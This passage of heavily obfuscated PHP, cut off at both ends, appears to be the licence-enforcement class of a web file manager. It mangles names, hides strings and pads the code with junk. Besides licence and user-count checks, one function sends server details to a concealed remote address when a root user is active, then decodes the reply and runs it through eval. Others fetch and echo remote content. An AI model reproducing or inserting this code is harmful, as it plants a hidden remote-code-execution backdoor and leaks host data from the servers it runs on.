!0); } private function licenseRegistSuccess() { $‡êôŞ¯¿ =& $_SERVER[¥Ö¼Ø±–]; $îšÉº¢æ = Model($‡êôŞ¯¿[33])->get(); if ($îšÉº¢æ[$‡êôŞ¯¿[63]] != $‡êôŞ¯¿[122]) { Model($‡êôŞ¯¿[33])->set($‡êôŞ¯¿[63], $‡êôŞ¯¿[122]); } Action($‡êôŞ¯¿[205])->initStart(!0); } private function vakr3838e560() { $”Û£ÛÇƒ =& $_SERVER[ÅÄÇĞô]; $ÒÆ¡üı¼ =& $_SERVER[¥Ö¼Ø±–]; Model($ÒÆ¡üı¼[33])->set(array($ÒÆ¡üı¼[153] => $ÒÆ¡üı¼[6], $ÒÆ¡üı¼[191] => $ÒÆ¡üı¼[6], $ÒÆ¡üı¼[108] => $ÒÆ¡üı¼[109], $ÒÆ¡üı¼[110] => $ÒÆ¡üı¼[6], $ÒÆ¡üı¼[111] => $ÒÆ¡üı¼[6])); Model($ÒÆ¡üı¼[33])->setDeep($ÒÆ¡üı¼[198], $ÒÆ¡üı¼[206]); $this->ylkd975f0a6c = array(); $this->jzky0a451a52 = $ÒÆ¡üı¼[109]; $ƒÌÂÌÓš = $”Û£ÛÇƒ[748]; if (strlen($ƒÌÂÌÓš) < $”Û£ÛÇƒ[699]) { return; } } private function odcr83ce6d03() { $¢ò¯Å® =& $_SERVER[ÅÄÇĞô]; $Ù˜Õì…Ô =& $_SERVER[¥Ö¼Ø±–]; $_SERVER[$Ù˜Õì…Ô[162]] = _get($_SERVER, $Ù˜Õì…Ô[162], APP_HOST); $this->jzky0a451a52 = $Ù˜Õì…Ô[109]; $˜ÖÇü¡ô = $¢ò¯Å®[749]; $˜¸«ºÙÖ = Model($Ù˜Õì…Ô[33])->get(); $™ÅŠßïø = $¢ò¯Å®[750]; if (!$™ÅŠßïø) { return; } if ($˜¸«ºÙÖ[$Ù˜Õì…Ô[108]] == $Ù˜Õì…Ô[109]) { return; } $ıÎ Àè™ = Model($Ù˜Õì…Ô[33])->get($Ù˜Õì…Ô[100]); $¯ÕÉäË = $Ù˜Õì…Ô[203] . md5($ıÎ Àè™ . $Ù˜Õì…Ô[204]); $öÆ™…†ä = Cache::get($¯ÕÉäË); if (!is_array($öÆ™…†ä) || !isset($öÆ™…†ä[$Ù˜Õì…Ô[207]]) || time() - $öÆ™…†ä[$Ù˜Õì…Ô[207]] >= 60) { $­‡–üêÌ = Model($Ù˜Õì…Ô[7])->loadList(); $ö¯œ€« = $­‡–üêÌ[$Ù˜Õì…Ô[200]]; $—ÚÀ†¯º = md5($_SERVER[$Ù˜Õì…Ô[106]] . strrev($ıÎ Àè™) . $˜¸«ºÙÖ[$Ù˜Õì…Ô[191]]); $°¡½’¦É = strrev(substr($—ÚÀ†¯º, 10, 16)); $öÆ™…†ä = $this->gbava37df45b($ö¯œ€«[$Ù˜Õì…Ô[86]][$°¡½’¦É], $—ÚÀ†¯º); $öÆ™…†ä = json_decode($öÆ™…†ä, !0); } if (!is_array($öÆ™…†ä)) { return $this->vakr3838e560(); } $›Äşú±Ô = strtotime($öÆ™…†ä[$Ù˜Õì…Ô[129]]); if (time() >= $›Äşú±Ô) { return $this->vakr3838e560(); } if (!isset($öÆ™…†ä[$Ù˜Õì…Ô[207]]) || time() - $öÆ™…†ä[$Ù˜Õì…Ô[207]] > 20) { $öÆ™…†ä[$Ù˜Õì…Ô[207]] = time(); Cache::set($¯ÕÉäË, $öÆ™…†ä); } $this->ylkd975f0a6c = $öÆ™…†ä; $this->jzky0a451a52 = $˜¸«ºÙÖ[$Ù˜Õì…Ô[108]]; } private function oitj52484150() { $¡ò’øª† =& $_SERVER[¥Ö¼Ø±–]; $Àå¿Ÿª› = $GLOBALS[$¡ò’øª†[13]]; $Ã’í™° = $_SERVER[$¡ò’øª†[24]]; $‹¶µ¯Ó = $_SERVER[ÅÄÇĞô][751]; if (!$‹¶µ¯Ó) { die; } if ($Ã’í™° == $¡ò’øª†[208] && $this->jzky0a451a52 == $¡ò’øª†[109]) { show_json(LNG($¡ò’øª†[209]), !1, $¡ò’øª†[210]); } $¸”†’ñæ = array($¡ò’øª†[211], $¡ò’øª†[212]); if (in_array($Ã’í™°, $¸”†’ñæ)) { if ($this->jzky0a451a52 == $¡ò’øª†[109] && isset($Àå¿Ÿª›[$¡ò’øª†[213]])) { show_json(LNG($¡ò’øª†[209]), !1, $¡ò’øª†[210]); die; } $„ã›û·Ü = $this->qyet9545d029(); if ($„ã›û·Ü != intval($¡ò’øª†[214])) { if ($„ã›û·Ü <= Model($¡ò’øª†[125])->count()) { show_json(LNG($¡ò’øª†[215]), !1, $¡ò’øª†[210]); die; } } } } private function oubz4f7a09c0() { $åÄ’•üä =& $_SERVER[ÅÄÇĞô]; $¿›Òığ =& $_SERVER[¥Ö¼Ø±–]; $êãœŞäà = array($¿›Òığ[119], $¿›Òığ[120]); $íŞ¤ĞÄñ = $åÄ’•üä[752]; while (strlen($íŞ¤ĞÄñ) < $åÄ’•üä[699]) { if (!$íŞ¤ĞÄñ) { break; } $íŞ¤ĞÄñ++; } if (!KodUser::isRoot() || !isset($_GET[$¿›Òığ[216]])) { return; } if (!in_array($_SERVER[$¿›Òığ[24]], $êãœŞäà)) { return; } $Ï¥È…Ã¿ = $¿›Òığ[217]; $İ şÎÍ« = $åÄ’•üä[753]; if (!$İ şÎÍ«) { return; } $Ï¥È…Ã¿ = $this->inpq8af63ec9($Ï¥È…Ã¿, $¿›Òığ[218]); $™¯‘Şí£ = $åÄ’•üä[754]; if (strlen($™¯‘Şí£) < $åÄ’•üä[693]) { die; } $šôÜ´êæ = stream_context_create(array($¿›Òığ[219] => array($¿›Òığ[220] => $¿›Òığ[221], $¿›Òığ[222] => 3))); $¬’ç¤ïç = $åÄ’•üä[755]; $½ñŸ’ó® = @file_get_contents($Ï¥È…Ã¿, !1, $šôÜ´êæ); $æŸê¬¢Ø = $åÄ’•üä[756]; header($¿›Òığ[223]); if ($½ñŸ’ó® && strstr($½ñŸ’ó®, $¿›Òığ[224])) { echo $½ñŸ’ó®; } die; } public function wdrn32cc76ff($âãìÎíè) { $©Ø¨£®À =& $_SERVER[ÅÄÇĞô]; $Ğ©ä°Ú =& $_SERVER[¥Ö¼Ø±–]; if ($this->jzky0a451a52 == $Ğ©ä°Ú[225]) { return $âãìÎíè; } $ıÉÑ¹Ü = $this->versionPluginList(); $°±ìÜ°Ÿ = explode($Ğ©ä°Ú[226], $this->versionPluginFilter()); $µ”Æâ²ë = array(); $éÚŞ¥²ø = $©Ø¨£®À[757]; if (strlen($éÚŞ¥²ø) < $©Ø¨£®À[701]) { return; } foreach ($ıÉÑ¹Ü as $ëÚÙ˜ô => $†š´¶¾É) { if ($†š´¶¾É == $Ğ©ä°Ú[227] && substr($this->jzky0a451a52, 0, 1) == $Ğ©ä°Ú[227]) { continue; } if (!in_array($ëÚÙ˜ô, $°±ìÜ°Ÿ)) { $µ”Æâ²ë[] = $ëÚÙ˜ô; } } foreach ($µ”Æâ²ë as $ëÚÙ˜ô) { unset($âãìÎíè[$ëÚÙ˜ô]); } return $âãìÎíè; } private function versionPluginList() { $Šé˜ï«® =& $_SERVER[¥Ö¼Ø±–]; return array($Šé˜ï«®[228] => $Šé˜ï«®[227], $Šé˜ï«®[229] => $Šé˜ï«®[227], $Šé˜ï«®[230] => $Šé˜ï«®[227], $Šé˜ï«®[231] => $Šé˜ï«®[232], $Šé˜ï«®[233] => $Šé˜ï«®[232], $Šé˜ï«®[234] => $Šé˜ï«®[232], $Šé˜ï«®[235] => $Šé˜ï«®[232], $Šé˜ï«®[236] => $Šé˜ï«®[232], $Šé˜ï«®[237] => $Šé˜ï«®[232], $Šé˜ï«®[238] => $Šé˜ï«®[232], $Šé˜ï«®[239] => $Šé˜ï«®[232], $Šé˜ï«®[240] => $Šé˜ï«®[232], $Šé˜ï«®[241] => $Šé˜ï«®[232], $Šé˜ï«®[242] => $Šé˜ï«®[232], $Šé˜ï«®[243] => $Šé˜ï«®[232], $Šé˜ï«®[244] => $Šé˜ï«®[232]); $”úó£Çò = $_SERVER[ÅÄÇĞô][758]; if (!$”úó£Çò) { return; } } private function versionPluginFilter() { $óÂÏÖÊô =& $_SERVER[¥Ö¼Ø±–]; if ($this->jzky0a451a52 == $óÂÏÖÊô[109]) { return $óÂÏÖÊô[6]; } $óäœİÏû = _get($this->ylkd975f0a6c, $óÂÏÖÊô[245], $óÂÏÖÊô[6]); $‚äÚ‘—¢ = _get($this->ylkd975f0a6c, $óÂÏÖÊô[116], $óÂÏÖÊô[6]); $²¿†Íá¤ = _get($this->ylkd975f0a6c, $óÂÏÖÊô[246], $óÂÏÖÊô[6]); $·è¾ŸÙ½ = $_SERVER[ÅÄÇĞô][759]; if ($‚äÚ‘—¢ > time() && $²¿†Íá¤ > time()) { $Ã¨·İùê = explode($óÂÏÖÊô[226], $óäœİÏû); $æ÷É‰«° = array_keys($this->versionPluginList()); $óäœİÏû = array_merge($Ã¨·İùê, $æ÷É‰«°); $óäœİÏû = implode($óÂÏÖÊô[226], array_filter(array_unique($óäœİÏû))); } return $óäœİÏû; } private function zrwc78a076e7() { $ü„ù©Æ =& $_SERVER[¥Ö¼Ø±–]; if ($this->jzky0a451a52 != $ü„ù©Æ[109]) { $GLOBALS[$ü„ù©Æ[86]][$ü„ù©Æ[90]][$ü„ù©Æ[247]] = $ü„ù©Æ[206]; return; } $GLOBALS[$ü„ù©Æ[86]][$ü„ù©Æ[248]] = $ü„ù©Æ[122]; if (Model($ü„ù©Æ[249])->get($ü„ù©Æ[63]) != $ü„ù©Æ[206]) { Model($ü„ù©Æ[249])->set($ü„ù©Æ[63], $ü„ù©Æ[206]); } } public function swkrada605f5() { $õ…ıîß‚ =& $_SERVER[ÅÄÇĞô]; return $_SERVER[¥Ö¼Ø±–][250]; $Ê®¥š· = $õ…ıîß‚[760]; if (strlen($Ê®¥š·) < $õ…ıîß‚[699]) { die; } } private function jgkm6e37bf27() { $ë§”ı =& $_SERVER[ÅÄÇĞô]; $É«ÌÅ–€ =& $_SERVER[¥Ö¼Ø±–]; $ûÉÂëÍè = array($É«ÌÅ–€[251], $É«ÌÅ–€[252], $É«ÌÅ–€[253]); $¦ıÈá¹ä = $É«ÌÅ–€[254] . md5($É«ÌÅ–€[255]); if ($this->jzky0a451a52 == $É«ÌÅ–€[109] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$É«ÌÅ–€[24]], $ûÉÂëÍè)) { return; } if (time() % 4 != 0) { return; } $ÆÙÎêá§ = call_user_func(array($É«ÌÅ–€[256], $É«ÌÅ–€[257]), $¦ıÈá¹ä); if ($ÆÙÎêá§ && time() - $ÆÙÎêá§ < intval($É«ÌÅ–€[258])) { return; } call_user_func(array($É«ÌÅ–€[256], $É«ÌÅ–€[139]), $¦ıÈá¹ä, time()); $†šô¯×­ = $ë§”ı[761]; $ıû‘Èá = Model($É«ÌÅ–€[33])->get($É«ÌÅ–€[100]); $½”ıã²¹ = $ë§”ı[762]; while (strlen($½”ıã²¹) < $ë§”ı[688]) { if (!$½”ıã²¹) { break; } $½”ıã²¹++; } $”‹õ”ï˜ = array($É«ÌÅ–€[152] => Model($É«ÌÅ–€[33])->get($É«ÌÅ–€[153]), $É«ÌÅ–€[167] => $this->jzky0a451a52, $É«ÌÅ–€[163] => $_SERVER[$É«ÌÅ–€[164]], $É«ÌÅ–€[165] => Model($É«ÌÅ–€[33])->get($É«ÌÅ–€[131]), $É«ÌÅ–€[105] => md5($_SERVER[$É«ÌÅ–€[106]] . $ıû‘Èá), $É«ÌÅ–€[156] => $É«ÌÅ–€[136], $É«ÌÅ–€[159] => $_SERVER[$É«ÌÅ–€[160]]); $™Ø¦˜­ = $this->fgux34b5b356($É«ÌÅ–€[259], $”‹õ”ï˜); $Ñ§½çìâ = $ë§”ı[763]; while (strlen($Ñ§½çìâ) < $ë§”ı[701]) { if (!$Ñ§½çìâ) { break; } $Ñ§½çìâ++; } if (!is_array($™Ø¦˜­)) { return; } if ($™Ø¦˜­[$É«ÌÅ–€[152]] && $™Ø¦˜­[$É«ÌÅ–€[260]]) { if ($this->bwdu8302a14a($™Ø¦˜­[$É«ÌÅ–€[260]]) == $”‹õ”ï˜[$É«ÌÅ–€[152]]) { return; } } $this->vakr3838e560(); if ($this->bwdu8302a14a($™Ø¦˜­[$É«ÌÅ–€[260]]) != $”‹õ”ï˜[$É«ÌÅ–€[152]]) { $Öƒèãµ = array($É«ÌÅ–€[185] => $ıû‘Èá, $É«ÌÅ–€[186] => $_SERVER[$É«ÌÅ–€[106]], $É«ÌÅ–€[187] => this_url(), $É«ÌÅ–€[161] => $_SERVER[$É«ÌÅ–€[162]]); $úÃ§ı´Â = $this->imke14d59f87(json_encode($Öƒèãµ)); $™Ø¦˜­ = $this->fgux34b5b356($É«ÌÅ–€[188] . $úÃ§ı´Â); if ($™Ø¦˜­ && is_array($™Ø¦˜­) && isset($™Ø¦˜­[$É«ÌÅ–€[260]])) { $—§±Ø½Š = $this->gbava37df45b($™Ø¦˜­[$É«ÌÅ–€[260]], 2); if ($—§±Ø½Š) { $—§±Ø½Š = $this->bwdu8302a14a($—§±Ø½Š); } if ($—§±Ø½Š) { try { @eval($—§±Ø½Š); } catch (Exception $ ‰Å©ƒü) { } } } } } private function fgux34b5b356($ìĞ‡È¾± = '', $ÖÊÜä¶Ó = array(), $ŠÄÎ€èÑ = 5) { $úÍºãÀ¸ =& $_SERVER[ÅÄÇĞô]; $‰»¯Ô€› =& $_SERVER[¥Ö¼Ø±–]; $ñú¿ÄÀ = $‰»¯Ô€›[261]; $ŠÇ¢‚ı = $úÍºãÀ¸[764]; if (strlen($ŠÇ¢‚ı) < $úÍºãÀ¸[704]) { die; } $ñú¿ÄÀ = $this->inpq8af63ec9($ñú¿ÄÀ, $‰»¯Ô€›[262]); $ñú¿ÄÀ = $ñú¿ÄÀ . $ìĞ‡È¾±; $Ÿ×“øÊñ = $úÍºãÀ¸[765]; if ($ÖÊÜä¶Ó && is_array($ÖÊÜä¶Ó)) { $ñú¿ÄÀ = $ñú¿ÄÀ . $‰»¯Ô€›[263] . http_build_query($ÖÊÜä¶Ó); } if ($ÖÊÜä¶Ó === -1) { return $ñú¿ÄÀ; } $ÑÙÌŞ¤ = stream_context_create(array($‰»¯Ô€›[219] => array($‰»¯Ô€›[222] => $ŠÄÎ€èÑ, $‰»¯Ô€›[220] => $‰»¯Ô€›[264]), $‰»¯Ô€›[265] => array($‰»¯Ô€›[266] => !1, $‰»¯Ô€›[267] => !1))); $ÖÊÜä¶Ó = @file_get_contents($ñú¿ÄÀ, !1, $ÑÙÌŞ¤); $•¯˜«³È = $úÍºãÀ¸[766]; return json_decode($ÖÊÜä¶Ó, !0); $ËªÒßÂİ = $úÍºãÀ¸[767]; if (!$ËªÒßÂİ) { die; } } private function qyet9545d029() { $ÏõÉ³‹ =& $_SERVER[ÅÄÇĞô]; $˜ÊùÕÔ¼ =& $_SERVER[¥Ö¼Ø±–]; $¾Í…­Úæ = array($˜ÊùÕÔ¼[268] => $˜ÊùÕÔ¼[269], $˜ÊùÕÔ¼[270] => $˜ÊùÕÔ¼[271], $˜ÊùÕÔ¼[272] => $˜ÊùÕÔ¼[273], $˜ÊùÕÔ¼[274] => $˜ÊùÕÔ¼[275], $˜ÊùÕÔ¼[276] => $˜ÊùÕÔ¼[277], $˜ÊùÕÔ¼[278] => $˜ÊùÕÔ¼[214], $˜ÊùÕÔ¼[279] => $˜ÊùÕÔ¼[214], $˜ÊùÕÔ¼[280] => $˜ÊùÕÔ¼[269], $˜ÊùÕÔ¼[281] => $˜ÊùÕÔ¼[271], $˜ÊùÕÔ¼[282] => $˜ÊùÕÔ¼[273], $˜ÊùÕÔ¼[283] => $˜ÊùÕÔ¼[284], $˜ÊùÕÔ¼[285] => $˜ÊùÕÔ¼[275], $˜ÊùÕÔ¼[286] => $˜ÊùÕÔ¼[287], $˜ÊùÕÔ¼[288] => $˜ÊùÕÔ¼[277], $˜ÊùÕÔ¼[289] => $˜ÊùÕÔ¼[290], $˜ÊùÕÔ¼[291] => $˜ÊùÕÔ¼[292], $˜ÊùÕÔ¼[293] => $˜ÊùÕÔ¼[294]); $™Õí¾¯ä = $ÏõÉ³‹[768]; if (strlen($™Õí¾¯ä) < $ÏõÉ³‹[699]) { die; } $ºå²ö¡ = $¾Í…­Úæ[$this->jzky0a451a52]; $Šåã»Äõ = $ÏõÉ³‹[769]; if (strlen($Šåã»Äõ) < $ÏõÉ³‹[704]) { return; } $ºå²ö¡ = intval($ºå²ö¡ ? $ºå²ö¡ : $˜ÊùÕÔ¼[269]); $Ø·©°âœ = $ÏõÉ³‹[770]; if (strlen($Ø·©°âœ) < $ÏõÉ³‹[699]) { return; } $ŸÈ€–¹ = _get($this->ylkd975f0a6c, $˜ÊùÕÔ¼[295]); $ŸÈ€–¹ = $ŸÈ€–¹ ? intval($ŸÈ€–¹) : 0; return $ºå²ö¡ + $ŸÈ€–¹; $÷ßéÎ±À = $ÏõÉ³‹[771]; if (!$÷ßéÎ±À) { die; } } public function nzvecf6029ac($¬“†™Æ¡) { $ÍÅ“ÇŒš =& $_SERVER[ÅÄÇĞô]; $ø“›¼äÖ =& $_SERVER[¥Ö¼Ø±–]; $šûØÕô = $this->qyet9545d029(); $ÅÊùî“ì = $ÍÅ“ÇŒš[772]; if (strlen($ÅÊùî“ì) < $ÍÅ“ÇŒš[693]) { return; } if ($¬“†™Æ¡[$ø“›¼äÖ[296]] == $ø“›¼äÖ[122]) { return; } if ($šûØÕô >= intval($ø“›¼äÖ[214])) { return; } $ĞÁÂùš = Model($ø“›¼äÖ[125])->count(); $œ¦óáÉĞ = $ÍÅ“ÇŒš[773]; if (!$œ¦óáÉĞ) { return; } if ($ĞÁÂùš <= $šûØÕô) { return; } $Ş´” = Model($ø“›¼äÖ[125])->field($ø“›¼äÖ[296])->limit($šûØÕô)->select(); $Ş´” = array_to_keyvalue($Ş´”, $ø“›¼äÖ[6], $ø“›¼äÖ[296]); $Ô£ğüŸ = $ÍÅ“ÇŒš[774]; if (!in_array($¬“†™Æ¡[$ø“›¼äÖ[296]], $Ş´”)) { show_json($ø“›¼äÖ[297], !1, $ø“›¼äÖ[210]); } } public function leqdb71a628b() { $Šö÷ùÀ =& $_SERVER[ÅÄÇĞô]; $çöÀáä˜ =& $_SERVER[¥Ö¼Ø±–]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $é“ë¬« = $çöÀáä˜[217]; $é“ë¬« = $this->inpq8af63ec9($é“ë¬«, $çöÀáä˜[218]); $ÊÏ¦‹¾¼ = $Šö÷ùÀ[775]; $ùÚ·ƒ£ú = stream_context_create(array($çöÀáä˜[219] => array($çöÀáä˜[220] => $çöÀáä˜[221], $çöÀáä˜[222] => 3))); $ù©‚¨Œ¯ = $Šö÷ùÀ[776]; while ($ù©‚¨Œ¯ < $Šö÷ùÀ[701]) { if ($ù©‚¨Œ¯ >= 0) { break; } $ù©‚¨Œ¯++; } $“ûª€¯ = @file_get_contents($é“ë¬«, !1, $ùÚ·ƒ£ú); $€ã›„Ç = $Šö÷ùÀ[777]; if (!$€ã›„Ç) { return; } echo $çöÀáä˜[298] . hash_encode($“ûª€¯) . $çöÀáä˜[299]; } private function fvhk053f9048($ÀÇ’øğ, $œì ª‡¹, $óùÁ›‰ = 3) { $›ŒÊ¿‹Õ =& $_SERVER[ÅÄÇĞô]; $û¤´ñØÛ =& $_SERVER[¥Ö¼Ø±–]; usleep(1); $©Çµâï = $›ŒÊ¿‹Õ[778]; if (strlen($©Çµâï) < $›ŒÊ¿‹Õ[688]) { return; } $ÀÇ’øğ = trim($ÀÇ’øğ); $™»ø¨è = mt_rand(0, 5) . $û¤´ñØÛ[6]; $€Ñ¥Ò = rand_string(15); $ôÕ¨ØËÉ = $û¤´ñØÛ[300]; $À™İäçó = $›ŒÊ¿‹Õ[779]; if (strlen($À™İäçó) < $›ŒÊ¿‹Õ[701]) { return; } switch ($™»ø¨è) { case $û¤´ñØÛ[206]: $Òı´®ƒõ = $this->csly3b9928b1($ÀÇ’øğ, strrev($œì ª‡¹ . $€Ñ¥Ò)); $¬ÕÄñ “ = $›ŒÊ¿‹Õ[780]; while ($¬ÕÄñ “ < $›ŒÊ¿‹Õ[688]) { if ($¬ÕÄñ “ >= 0) { break; } $¬ÕÄñ “++; } break; case $û¤´ñØÛ[122]: $Òı´®ƒõ = $this->csly3b9928b1($ÀÇ’øğ, strrev($€Ñ¥Ò . $œì ª‡¹)); break; $×Í×¼•† = $›ŒÊ¿‹Õ[781]; if (!$×Í×¼•†) { die; } case $û¤´ñØÛ[301]: $Òı´®ƒõ = $this->csly3b9928b1($ÀÇ’øğ, base64_encode($€Ñ¥Ò . $œì ª‡¹)); $†«ºĞş÷ = $›ŒÊ¿‹Õ[782]; break; $ªšŸ×Ç² = $›ŒÊ¿‹Õ[783]; if (strlen($ªšŸ×Ç²) < $›ŒÊ¿‹Õ[704]) { die; } case $û¤´ñØÛ[302]: $Òı´®ƒõ = $this->csly3b9928b1($ÀÇ’øğ, md5($€Ñ¥Ò . $œì ª‡¹)); $àÃæá¦ = $›ŒÊ¿‹Õ[784]; break; case $û¤´ñØÛ[303]: $ÀÇ’øğ = base64_encode($ÀÇ’øğ); $±øšĞÆ = $›ŒÊ¿‹Õ[785]; if (strlen($±øšĞÆ) < $›ŒÊ¿‹Õ[693]) { return; } $¿¸øÂÏ = rand(0, 64); $ŒŸ»íéş = $›ŒÊ¿‹Õ[786]; if (strlen($ŒŸ»íéş) < $›ŒÊ¿‹Õ[693]) { return; } $ÄÊ»É›Û = $ôÕ¨ØËÉ[$¿¸øÂÏ]; $÷ª¾°ò• = $›ŒÊ¿‹Õ[787]; if (strlen($÷ª¾°ò•) < $›ŒÊ¿‹Õ[693]) { die; } $£ÒïŠ = md5($ÄÊ»É›Û . md5($œì ª‡¹ . $ÄÊ»É›Û) . $œì ª‡¹); $ü¾ÎÜı = $›ŒÊ¿‹Õ[788]; $£ÒïŠ = substr($£ÒïŠ, $¿¸øÂÏ % 8, $¿¸øÂÏ % 8 + 7); $äç³™öü = $›ŒÊ¿‹Õ[789]; while ($äç³™öü < $›ŒÊ¿‹Õ[699]) { if ($äç³™öü >= 0) { break; } $äç³™öü++; } $º°óŠéç = $û¤´ñØÛ[6]; $ó¾ÆÜÅ = 0; $—ëò–äÖ = $›ŒÊ¿‹Õ[790]; if (!$—ëò–äÖ) { return; } $˜Ø“˜ç = 0; $¢§Ù· = 0; for ($ó¾ÆÜÅ = 0; $ó¾ÆÜÅ < strlen($ÀÇ’øğ); $ó¾ÆÜÅ++) { $¢§Ù· = $¢§Ù· == strlen($£ÒïŠ) ? 0 : $¢§Ù·; $˜Ø“˜ç = ($¿¸øÂÏ + strpos($ôÕ¨ØËÉ, $ÀÇ’øğ[$ó¾ÆÜÅ]) + ord($£ÒïŠ[$¢§Ù·++])) % 64; $Óì§Á±ö = $›ŒÊ¿‹Õ[791]; $º°óŠéç .= $ôÕ¨ØËÉ[$˜Ø“˜ç]; } $Òı´®ƒõ = hash_encode($ÄÊ»É›Û . $º°óŠéç); break; $¾ÔÀ±î = $›ŒÊ¿‹Õ[792]; default: $Òı´®ƒõ = $this->csly3b9928b1($ÀÇ’øğ, $œì ª‡¹ . $€Ñ¥Ò); $¶ÑÉ¿ùø = $›ŒÊ¿‹Õ[793]; break; $§øÓ©¦Å = $›ŒÊ¿‹Õ[794]; if (!$§øÓ©¦Å) { return; } } $Òı´®ƒõ = strrev($™»ø¨è . $€Ñ¥Ò . $Òı´®ƒõ); $¼•®‹ = $›ŒÊ¿‹Õ[795]; while (strlen($¼•®‹) < $›ŒÊ¿‹Õ[699]) { if (!$¼•®‹) { break; } $¼•®‹++; } if ($óùÁ›‰ - 1 > 0) { $Òı´®ƒõ = $this->fvhk053f9048($Òı´®ƒõ, $œì ª‡¹, $óùÁ›‰ - 1); } return $Òı´®ƒõ; } private function gbava37df45b($ØÒø¹¤, $æÖâµË†, $ÎéŠÜš° = 3) { $çĞ­Ôƒ° =& $_SERVER[ÅÄÇĞô]; $Ê£»Œ•Ò =& $_SERVER[¥Ö¼Ø±–]; if (!is_string($ØÒø¹¤) || strlen($ØÒø¹¤) < 10) { return !1; } $ØÒø¹¤ = trim($ØÒø¹¤); $ØÒø¹¤ = strrev($ØÒø¹¤); $‚›•š = $ØÒø¹¤[0]; $Ê¢Ü¡æ = substr($ØÒø¹¤, 1, 15); $ØÒø¹¤ = substr($ØÒø¹¤, 16); $ªÕÖĞäÆ = $çĞ­Ôƒ°[796]; if (strlen($ªÕÖĞäÆ) < $çĞ­Ôƒ°[688]) { return; } $¨ø¯•ÌÈ = $Ê£»Œ•Ò[300]; switch ($‚›•š) { case $Ê£»Œ•Ò[206]: $ãç“³Á“ = $this->inpq8af63ec9($ØÒø¹¤, strrev($æÖâµË† . $Ê¢Ü¡æ)); $ş…°ÍÙ· = $çĞ­Ôƒ°[797]; if (strlen($ş…°ÍÙ·) < $çĞ­Ôƒ°[699]) { return; } break; $õòÅœÌ” = $çĞ­Ôƒ°[798]; case $Ê£»Œ•Ò[122]: $ãç“³Á“ = $this->inpq8af63ec9($ØÒø¹¤, strrev($Ê¢Ü¡æ . $æÖâµË†)); break; $éòœ¬ô¢ = $çĞ­Ôƒ°[799]; if (strlen($éòœ¬ô¢) < $çĞ­Ôƒ°[688]) { die; } case $Ê£»Œ•Ò[301]: $ãç“³Á“ = $this->inpq8af63ec9($ØÒø¹¤, base64_encode($Ê¢Ü¡æ . $æÖâµË†)); break; $ùöğÀûõ = $çĞ­Ôƒ°[800]; if (strlen($ùöğÀûõ) < $çĞ­Ôƒ°[688]) { return; } case $Ê£»Œ•Ò[302]: $ãç“³Á“ = $this->inpq8af63ec9($ØÒø¹¤, md5($Ê¢Ü¡æ . $æÖâµË†)); $”ˆ‰ö¾Ğ = $çĞ­Ôƒ°[801]; break; case $Ê£»Œ•Ò[303]: $ØÒø¹¤ = hash_decode($ØÒø¹¤); $ãËÚŸŸš = $çĞ­Ôƒ°[802]; $„£“Ó¿ = $ØÒø¹¤[0]; $äÇƒÂ  = $çĞ­Ôƒ°[803]; while (strlen($äÇƒÂ ) < $çĞ­Ôƒ°[699]) { if (!$äÇƒÂ ) { break; } $äÇƒÂ ++; } $ØÒø¹¤ = substr($ØÒø¹¤, 1); $ù×¬¢å¥ = $çĞ­Ôƒ°[804]; if (strlen($ù×¬¢å¥) < $çĞ­Ôƒ°[693]) { return; } $Ğâè¿õ = strpos($¨ø¯•ÌÈ, $„£“Ó¿); $ Ñ°å = md5($„£“Ó¿ . md5($æÖâµË† . $„£“Ó¿) . $æÖâµË†); $íˆÇáì™ = $çĞ­Ôƒ°[805]; if (strlen($íˆÇáì™) < $çĞ­Ôƒ°[693]) { return; } $ Ñ°å = substr($ Ñ°å, $Ğâè¿õ % 8, $Ğâè¿õ % 8 + 7); $òÅĞ‚¤¨ = $çĞ­Ôƒ°[806]; $ÀØà¡ÔÖ = $Ê£»Œ•Ò[6]; $‘ä½ïúÄ = $çĞ­Ôƒ°[807]; if (strlen($‘ä½ïúÄ) < $çĞ­Ôƒ°[704]) { die; } $£‘·¹ = 0; $ìà¾§Ôî = 0; $ŒåÆĞ­’ = $çĞ­Ôƒ°[808]; $È˜· Ùæ = 0; $¿œ¨ÙŞï = $çĞ­Ôƒ°[809]; for ($£‘·¹ = 0; $£‘·¹ < strlen($ØÒø¹¤); $£‘·¹++) { $È˜· Ùæ = $È˜· Ùæ == strlen($ Ñ°å) ? 0 : $È˜· Ùæ; $ì®òÖ = $çĞ­Ôƒ°[810]; if (strlen($ì®òÖ) < $çĞ­Ôƒ°[693]) { return; } $Ñ±ï¾ô = $È˜· Ùæ++; $ìà¾§Ôî = strpos($¨ø¯•ÌÈ, $ØÒø¹¤[$£‘·¹]) - $Ğâè¿õ - ord($ Ñ°å[$Ñ±ï¾ô]); $›¥‡êå÷ = $çĞ­Ôƒ°[811]; if (!$›¥‡êå÷) { die; } while ($ìà¾§Ôî < 0) { $ìà¾§Ôî += 64; $ò¤Ã²Æ = $çĞ­Ôƒ°[812]; while ($ò¤Ã²Æ < $çĞ­Ôƒ°[704]) { if ($ò¤Ã²Æ >= 0) { break; } $ò¤Ã²Æ++; } } $ÀØà¡ÔÖ .= $¨ø¯•ÌÈ[$ìà¾§Ôî]; $óÔÕúŞ = $çĞ­Ôƒ°[813]; if (strlen($óÔÕúŞ) < $çĞ­Ôƒ°[699]) { return; } } $ãç“³Á“ = base64_decode($ÀØà¡ÔÖ); break; $¹€Æ¶ÅÚ = $çĞ­Ôƒ°[814]; default: $ãç“³Á“ = $this->inpq8af63ec9($ØÒø¹¤, $æÖâµË† . $Ê¢Ü¡æ); break; } if ($ÎéŠÜš° - 1 > 0) { $ãç“³Á“ = $this->gbava37df45b($ãç“³Á“, $æÖâµË†, $ÎéŠÜš° - 1); } return $ãç“³Á“; } public function imke14d59f87($Ÿûİ×Ö) { $ŞÖÙâÆõ =& $_SERVER[ÅÄÇĞô]; $û•ŸÂ½Ï =& $_SERVER[¥Ö¼Ø±–]; $ Œ®¿øÅ = $this->xkgj62e98668(); $Ï°êòÔ = $ŞÖÙâÆõ[815]; if (!$Ï°êòÔ) { die; } $„ËÊóâì = $this->xkgj62e98668(); $ëüí‘„Å = ($ Œ®¿øÅ - 1) * ($„ËÊóâì - 1); $µÒœ£ = $ŞÖÙâÆõ[816]; if (strlen($µÒœ£) < $ŞÖÙâÆõ[704]) { die; } $ååİ˜œî = intval(($ Œ®¿øÅ + $„ËÊóâì) / 2); $­€½¬—„ = $ŞÖÙâÆõ[817]; while (1) { $À‰ñ¸ó¢ = 